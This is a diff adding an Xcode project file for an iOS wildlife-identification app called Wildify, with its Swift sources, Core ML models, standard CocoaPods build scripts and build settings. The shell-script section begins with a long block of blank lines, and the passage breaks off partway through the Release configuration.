@@ -1,0 +1,932 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 51;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		180A0CE725B9E7FF00ECF717 /* UIExtensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0CE625B9E7FF00ECF717 /* UIExtensions.swift */; };
+		180A0CF625B9E9FE00ECF717 /* SourceLibraryColCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0CF525B9E9FE00ECF717 /* SourceLibraryColCell.swift */; };
+		180A0CF925B9EB0500ECF717 /* WildLifeLawsColCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0CF825B9EB0500ECF717 /* WildLifeLawsColCell.swift */; };
+		180A0D1B25B9FC8C00ECF717 /* SpeciesLibraryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0D1A25B9FC8C00ECF717 /* SpeciesLibraryVC.swift */; };
+		180A0D1E25BA02DD00ECF717 /* SpeciesLibTabCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0D1D25BA02DD00ECF717 /* SpeciesLibTabCell.swift */; };
+		180A0D2125BA1B8A00ECF717 /* SpeciesDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0D2025BA1B8A00ECF717 /* SpeciesDetailVC.swift */; };
+		180A0D2425BA245400ECF717 /* wildLawTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0D2325BA245400ECF717 /* wildLawTableCell.swift */; };
+		180A0D2825BA24EA00ECF717 /* WildLifeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0D2725BA24EA00ECF717 /* WildLifeVC.swift */; };
+		180A0D2B25BA291800ECF717 /* wildLawsDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0D2A25BA291800ECF717 /* wildLawsDetailVC.swift */; };
+		180A0D3D25BA398100ECF717 /* SplashVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0D3C25BA398100ECF717 /* SplashVC.swift */; };
+		180A0D4025BA3C5900ECF717 /* tabbar.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180A0D3F25BA3C5900ECF717 /* tabbar.swift */; };
+		B7014C7B257690B800FDD63F /* LawsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = B7014C7A257690B800FDD63F /* LawsTableViewCell.swift */; };
+		B7014C7E25769E2B00FDD63F /* LawDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = B7014C7D25769E2B00FDD63F /* LawDetailViewController.swift */; };
+		B723BB48256ADC0000B8A289 /* SpecieDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = B723BB47256ADC0000B8A289 /* SpecieDetailsViewController.swift */; };
+		B744E5AB25BDE5B9001A645F /* wildifyClassifier.mlmodel in Sources */ = {isa = PBXBuildFile; fileRef = B744E5AA25BDE5B9001A645F /* wildifyClassifier.mlmodel */; };
+		B760995423DA8A50007A7206 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76AA2F42377C54D00D8E9D4 /* ViewController.swift */; };
+		B76AA2BC2376BA1100D8E9D4 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76AA2BB2376BA1100D8E9D4 /* AppDelegate.swift */; };
+		B76AA2BE2376BA1100D8E9D4 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76AA2BD2376BA1100D8E9D4 /* SceneDelegate.swift */; };
+		B76AA2C52376BA1200D8E9D4 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = B76AA2C42376BA1200D8E9D4 /* Assets.xcassets */; };
+		B76AA2C82376BA1200D8E9D4 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B76AA2C62376BA1200D8E9D4 /* LaunchScreen.storyboard */; };
+		B76AA2D02376BAA500D8E9D4 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B76AA2CF2376BAA500D8E9D4 /* Main.storyboard */; };
+		B76AA2D52376BB3600D8E9D4 /* TestViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76AA2D12376BB3500D8E9D4 /* TestViewController.swift */; };
+		B76AA2D72376BB3600D8E9D4 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76AA2D32376BB3500D8E9D4 /* HomeViewController.swift */; };
+		B76AA2D82376BB3600D8E9D4 /* SubmitReport.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76AA2D42376BB3600D8E9D4 /* SubmitReport.swift */; };
+		B76AA2DC2376BD2C00D8E9D4 /* art.scnassets in Resources */ = {isa = PBXBuildFile; fileRef = B76AA2DB2376BD2C00D8E9D4 /* art.scnassets */; };
+		B76AA2EA2376E1C100D8E9D4 /* SpeciesLibrary.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76AA2E92376E1C100D8E9D4 /* SpeciesLibrary.swift */; };
+		B76AA2EE237713AC00D8E9D4 /* Laws.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76AA2ED237713AC00D8E9D4 /* Laws.swift */; };
+		B76AA2F02377B4AD00D8E9D4 /* zoohackathon.mlmodel in Sources */ = {isa = PBXBuildFile; fileRef = B76AA2EF2377B4AD00D8E9D4 /* zoohackathon.mlmodel */; };
+		B7B610C825733B6000CC7E86 /* CustomTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = B7B610C625733B6000CC7E86 /* CustomTableViewCell.swift */; };
+		B7B610C925733B6000CC7E86 /* CustomTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = B7B610C725733B6000CC7E86 /* CustomTableViewCell.xib */; };
+		B7B610CC2574039B00CC7E86 /* Specie.swift in Sources */ = {isa = PBXBuildFile; fileRef = B7B610CB2574039B00CC7E86 /* Specie.swift */; };
+		C63A006A1ADE529ED1729FC4 /* Pods_Wildify.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8C58234FBA0DAAFADDD36887 /* Pods_Wildify.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		180A0CE625B9E7FF00ECF717 /* UIExtensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UIExtensions.swift; sourceTree = "<group>"; };
+		180A0CF525B9E9FE00ECF717 /* SourceLibraryColCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SourceLibraryColCell.swift; sourceTree = "<group>"; };
+		180A0CF825B9EB0500ECF717 /* WildLifeLawsColCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WildLifeLawsColCell.swift; sourceTree = "<group>"; };
+		180A0D1A25B9FC8C00ECF717 /* SpeciesLibraryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SpeciesLibraryVC.swift; sourceTree = "<group>"; };
+		180A0D1D25BA02DD00ECF717 /* SpeciesLibTabCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SpeciesLibTabCell.swift; sourceTree = "<group>"; };
+		180A0D2025BA1B8A00ECF717 /* SpeciesDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SpeciesDetailVC.swift; sourceTree = "<group>"; };
+		180A0D2325BA245400ECF717 /* wildLawTableCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = wildLawTableCell.swift; sourceTree = "<group>"; };
+		180A0D2725BA24EA00ECF717 /* WildLifeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WildLifeVC.swift; sourceTree = "<group>"; };
+		180A0D2A25BA291800ECF717 /* wildLawsDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = wildLawsDetailVC.swift; sourceTree = "<group>"; };
+		180A0D3C25BA398100ECF717 /* SplashVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SplashVC.swift; sourceTree = "<group>"; };
+		180A0D3F25BA3C5900ECF717 /* tabbar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = tabbar.swift; sourceTree = "<group>"; };
+		8C58234FBA0DAAFADDD36887 /* Pods_Wildify.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Wildify.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		A081946F70B40E07D16D6F5E /* Pods-Wildify.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Wildify.release.xcconfig"; path = "Target Support Files/Pods-Wildify/Pods-Wildify.release.xcconfig"; sourceTree = "<group>"; };
+		B7014C7A257690B800FDD63F /* LawsTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LawsTableViewCell.swift; sourceTree = "<group>"; };
+		B7014C7D25769E2B00FDD63F /* LawDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LawDetailViewController.swift; sourceTree = "<group>"; };
+		B723BB47256ADC0000B8A289 /* SpecieDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SpecieDetailsViewController.swift; sourceTree = "<group>"; };
+		B744E5AA25BDE5B9001A645F /* wildifyClassifier.mlmodel */ = {isa = PBXFileReference; lastKnownFileType = file.mlmodel; path = wildifyClassifier.mlmodel; sourceTree = "<group>"; };
+		B76AA2B82376BA1100D8E9D4 /* Wildify.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Wildify.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		B76AA2BB2376BA1100D8E9D4 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		B76AA2BD2376BA1100D8E9D4 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
+		B76AA2C42376BA1200D8E9D4 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		B76AA2C72376BA1200D8E9D4 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		B76AA2C92376BA1200D8E9D4 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		B76AA2CF2376BAA500D8E9D4 /* Main.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; path = Main.storyboard; sourceTree = "<group>"; };
+		B76AA2D12376BB3500D8E9D4 /* TestViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TestViewController.swift; sourceTree = "<group>"; };
+		B76AA2D32376BB3500D8E9D4 /* HomeViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
+		B76AA2D42376BB3600D8E9D4 /* SubmitReport.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SubmitReport.swift; sourceTree = "<group>"; };
+		B76AA2DB2376BD2C00D8E9D4 /* art.scnassets */ = {isa = PBXFileReference; lastKnownFileType = wrapper.scnassets; path = art.scnassets; sourceTree = "<group>"; };
+		B76AA2E92376E1C100D8E9D4 /* SpeciesLibrary.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SpeciesLibrary.swift; sourceTree = "<group>"; };
+		B76AA2ED237713AC00D8E9D4 /* Laws.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Laws.swift; sourceTree = "<group>"; };
+		B76AA2EF2377B4AD00D8E9D4 /* zoohackathon.mlmodel */ = {isa = PBXFileReference; lastKnownFileType = file.mlmodel; path = zoohackathon.mlmodel; sourceTree = "<group>"; };
+		B76AA2F42377C54D00D8E9D4 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
+		B7B610C625733B6000CC7E86 /* CustomTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTableViewCell.swift; sourceTree = "<group>"; };
+		B7B610C725733B6000CC7E86 /* CustomTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CustomTableViewCell.xib; sourceTree = "<group>"; };
+		B7B610CB2574039B00CC7E86 /* Specie.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Specie.swift; sourceTree = "<group>"; };
+		D1F6661140AD125A7890D899 /* Pods-Wildify.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Wildify.debug.xcconfig"; path = "Target Support Files/Pods-Wildify/Pods-Wildify.debug.xcconfig"; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		B76AA2B52376BA1100D8E9D4 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C63A006A1ADE529ED1729FC4 /* Pods_Wildify.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		A3E5B4C6AEEB903B5F207951 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				8C58234FBA0DAAFADDD36887 /* Pods_Wildify.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		B76AA2AF2376BA1100D8E9D4 = {
+			isa = PBXGroup;
+			children = (
+				B76AA2BA2376BA1100D8E9D4 /* Wildify */,
+				B76AA2B92376BA1100D8E9D4 /* Products */,
+				BCBEB5FE3E338CBF1D73FA0B /* Pods */,
+				A3E5B4C6AEEB903B5F207951 /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		B76AA2B92376BA1100D8E9D4 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				B76AA2B82376BA1100D8E9D4 /* Wildify.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		B76AA2BA2376BA1100D8E9D4 /* Wildify */ = {
+			isa = PBXGroup;
+			children = (
+				B76AA2F32377C52900D8E9D4 /* Controller */,
+				B76AA2F22377C52300D8E9D4 /* View */,
+				B76AA2F12377C51800D8E9D4 /* Model */,
+				B76AA2BB2376BA1100D8E9D4 /* AppDelegate.swift */,
+				B76AA2BD2376BA1100D8E9D4 /* SceneDelegate.swift */,
+				B76AA2C92376BA1200D8E9D4 /* Info.plist */,
+				B7B610C625733B6000CC7E86 /* CustomTableViewCell.swift */,
+				B7B610C725733B6000CC7E86 /* CustomTableViewCell.xib */,
+				B7B610CB2574039B00CC7E86 /* Specie.swift */,
+				B7014C7A257690B800FDD63F /* LawsTableViewCell.swift */,
+				B7014C7D25769E2B00FDD63F /* LawDetailViewController.swift */,
+				180A0CE625B9E7FF00ECF717 /* UIExtensions.swift */,
+				180A0CF525B9E9FE00ECF717 /* SourceLibraryColCell.swift */,
+				180A0CF825B9EB0500ECF717 /* WildLifeLawsColCell.swift */,
+				180A0D1A25B9FC8C00ECF717 /* SpeciesLibraryVC.swift */,
+				180A0D1D25BA02DD00ECF717 /* SpeciesLibTabCell.swift */,
+				180A0D2325BA245400ECF717 /* wildLawTableCell.swift */,
+				180A0D2725BA24EA00ECF717 /* WildLifeVC.swift */,
+				180A0D2A25BA291800ECF717 /* wildLawsDetailVC.swift */,
+				180A0D3C25BA398100ECF717 /* SplashVC.swift */,
+			);
+			path = Wildify;
+			sourceTree = "<group>";
+		};
+		B76AA2F12377C51800D8E9D4 /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				B744E5AA25BDE5B9001A645F /* wildifyClassifier.mlmodel */,
+				B76AA2EF2377B4AD00D8E9D4 /* zoohackathon.mlmodel */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		B76AA2F22377C52300D8E9D4 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				B76AA2C62376BA1200D8E9D4 /* LaunchScreen.storyboard */,
+				B76AA2CF2376BAA500D8E9D4 /* Main.storyboard */,
+				B76AA2C42376BA1200D8E9D4 /* Assets.xcassets */,
+				B76AA2DB2376BD2C00D8E9D4 /* art.scnassets */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		B76AA2F32377C52900D8E9D4 /* Controller */ = {
+			isa = PBXGroup;
+			children = (
+				B76AA2D32376BB3500D8E9D4 /* HomeViewController.swift */,
+				B76AA2D12376BB3500D8E9D4 /* TestViewController.swift */,
+				B76AA2F42377C54D00D8E9D4 /* ViewController.swift */,
+				B76AA2D42376BB3600D8E9D4 /* SubmitReport.swift */,
+				B76AA2E92376E1C100D8E9D4 /* SpeciesLibrary.swift */,
+				B76AA2ED237713AC00D8E9D4 /* Laws.swift */,
+				B723BB47256ADC0000B8A289 /* SpecieDetailsViewController.swift */,
+				180A0D2025BA1B8A00ECF717 /* SpeciesDetailVC.swift */,
+				180A0D3F25BA3C5900ECF717 /* tabbar.swift */,
+			);
+			path = Controller;
+			sourceTree = "<group>";
+		};
+		BCBEB5FE3E338CBF1D73FA0B /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				D1F6661140AD125A7890D899 /* Pods-Wildify.debug.xcconfig */,
+				A081946F70B40E07D16D6F5E /* Pods-Wildify.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		B76AA2B72376BA1100D8E9D4 /* Wildify */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = B76AA2CC2376BA1200D8E9D4 /* Build configuration list for PBXNativeTarget "Wildify" */;
+			buildPhases = (
+				029FC5D29F7F80D0C3EB8B99 /* [CP] Check Pods Manifest.lock */,
+				B76AA2B42376BA1100D8E9D4 /* Sources */,
+				B76AA2B52376BA1100D8E9D4 /* Frameworks */,
+				B76AA2B62376BA1100D8E9D4 /* Resources */,
+				9DFAB3D16DFCB8C55CE11F8B /* [CP] Embed Pods Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = Wildify;
+			productName = Wildify;
+			productReference = B76AA2B82376BA1100D8E9D4 /* Wildify.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		B76AA2B02376BA1100D8E9D4 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastSwiftUpdateCheck = 1120;
+				LastUpgradeCheck = 1220;
+				ORGANIZATIONNAME = "Thor Remiendo";
+				TargetAttributes = {
+					B76AA2B72376BA1100D8E9D4 = {
+						CreatedOnToolsVersion = 11.2.1;
+					};
+				};
+			};
+			buildConfigurationList = B76AA2B32376BA1100D8E9D4 /* Build configuration list for PBXProject "Wildify" */;
+			compatibilityVersion = "Xcode 9.3";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = B76AA2AF2376BA1100D8E9D4;
+			productRefGroup = B76AA2B92376BA1100D8E9D4 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				B76AA2B72376BA1100D8E9D4 /* Wildify */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		B76AA2B62376BA1100D8E9D4 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				B76AA2C82376BA1200D8E9D4 /* LaunchScreen.storyboard in Resources */,
+				B76AA2DC2376BD2C00D8E9D4 /* art.scnassets in Resources */,
+				B76AA2C52376BA1200D8E9D4 /* Assets.xcassets in Resources */,
+				B7B610C925733B6000CC7E86 /* CustomTableViewCell.xib in Resources */,
+				B76AA2D02376BAA500D8E9D4 /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		029FC5D29F7F80D0C3EB8B99 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Wildify-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		9DFAB3D16DFCB8C55CE11F8B /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Wildify/Pods-Wildify-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Wildify/Pods-Wildify-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Wildify/Pods-Wildify-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		B76AA2B42376BA1100D8E9D4 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				180A0D2825BA24EA00ECF717 /* WildLifeVC.swift in Sources */,
+				B723BB48256ADC0000B8A289 /* SpecieDetailsViewController.swift in Sources */,
+				B760995423DA8A50007A7206 /* ViewController.swift in Sources */,
+				B7B610C825733B6000CC7E86 /* CustomTableViewCell.swift in Sources */,
+				180A0CE725B9E7FF00ECF717 /* UIExtensions.swift in Sources */,
+				180A0D3D25BA398100ECF717 /* SplashVC.swift in Sources */,
+				B744E5AB25BDE5B9001A645F /* wildifyClassifier.mlmodel in Sources */,
+				B76AA2EA2376E1C100D8E9D4 /* SpeciesLibrary.swift in Sources */,
+				180A0CF925B9EB0500ECF717 /* WildLifeLawsColCell.swift in Sources */,
+				B7B610CC2574039B00CC7E86 /* Specie.swift in Sources */,
+				180A0D1B25B9FC8C00ECF717 /* SpeciesLibraryVC.swift in Sources */,
+				180A0D2125BA1B8A00ECF717 /* SpeciesDetailVC.swift in Sources */,
+				B76AA2D72376BB3600D8E9D4 /* HomeViewController.swift in Sources */,
+				180A0D2425BA245400ECF717 /* wildLawTableCell.swift in Sources */,
+				B76AA2BC2376BA1100D8E9D4 /* AppDelegate.swift in Sources */,
+				B76AA2F02377B4AD00D8E9D4 /* zoohackathon.mlmodel in Sources */,
+				180A0D2B25BA291800ECF717 /* wildLawsDetailVC.swift in Sources */,
+				180A0CF625B9E9FE00ECF717 /* SourceLibraryColCell.swift in Sources */,
+				180A0D4025BA3C5900ECF717 /* tabbar.swift in Sources */,
+				B76AA2EE237713AC00D8E9D4 /* Laws.swift in Sources */,
+				B76AA2D52376BB3600D8E9D4 /* TestViewController.swift in Sources */,
+				180A0D1E25BA02DD00ECF717 /* SpeciesLibTabCell.swift in Sources */,
+				B7014C7E25769E2B00FDD63F /* LawDetailViewController.swift in Sources */,
+				B7014C7B257690B800FDD63F /* LawsTableViewCell.swift in Sources */,
+				B76AA2D82376BB3600D8E9D4 /* SubmitReport.swift in Sources */,
+				B76AA2BE2376BA1100D8E9D4 /* SceneDelegate.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		B76AA2C62376BA1200D8E9D4 /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				B76AA2C72376BA1200D8E9D4 /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		B76AA2CA2376BA1200D8E9D4 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 13.1;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		B76AA2CB2376BA1200D8E9D4 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
